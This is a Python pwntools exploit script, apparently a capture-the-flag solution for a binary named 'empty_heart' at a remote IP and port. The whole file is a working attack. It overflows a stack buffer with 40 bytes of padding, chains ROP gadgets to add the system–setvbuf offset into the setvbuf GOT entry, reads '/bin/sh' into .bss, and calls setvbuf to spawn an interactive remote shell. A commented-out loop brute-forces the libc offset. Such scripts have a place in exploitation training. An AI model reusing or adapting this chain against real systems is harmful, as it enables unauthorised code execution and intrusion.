#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 94.237.68.111 --port 1024 ./empty_heart
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./empty_heart')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '94.237.68.111'
port = int(args.PORT or 1024)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0000000000400500
b *0x0000000000400686
continue
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


if args.LOCAL :
    libc = exe.libc
else :
    libc = ELF("libc.so.6")

def tohex(val, nbits):
  	return hex((val + (1 << nbits)) % (1 << nbits))

print hex(libc.sym["system"])
print hex(libc.sym["setvbuf"])
add_1 =  0x00000000004005d8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
pop_csu = 0x4006ea

libc_ending = int(tohex(libc.sym["system"] - libc.sym["setvbuf"],32),16)
# remote 0xfffce180
# local 0xfffd2180
print hex(libc_ending)
setvbuf_got = exe.got["setvbuf"]
pop_rdi = 0x00000000004006f3
pop_rsi = 0x00000000004006f1
setvbuf_plt = exe.plt["setvbuf"]
read_plt = exe.plt["read"]
bss = 0x0000000000601000 + 0x300
ret = 0x400686

def exploit():
    p = 'a'*40
    p+= p64(pop_csu)
    p+= p64(libc_ending) # rbx
    p+= p64(setvbuf_got+0x3d) # rbp
    p+= p64(0) # r12
    p+= p64(0) # r13
    p+= p64(0) # r14
    p+= p64(0) # r15
    p+= p64(add_1) #

    p+= p64(pop_rsi)
    p+= p64(bss)
    p+= p64(bss)
    p+= p64(read_plt)

    p+= p64(pop_rdi)
    p+= p64(bss)
    p+= p64(pop_rsi)
    p+= p64(0)
    p+= p64(0)
    p+= p64(setvbuf_plt)
    io.sendline(p)
    sleep(0.5)
    p = "/bin/sh\x00".ljust(0x3a,"\x00")
    io.sendline(p)

# for i in range(20):
#     try:
#         print (i)
#         libc_ending +=1
#         io = start()
#         exploit()
#         sleep(0.5)
#         io.sendline("echo AAAA")
#         if "AAAA" in io.recv():
#             print "found"
#             io.interactive()
#             break
#     except:
#         io.close()


io = start()

exploit()
io.interactive()
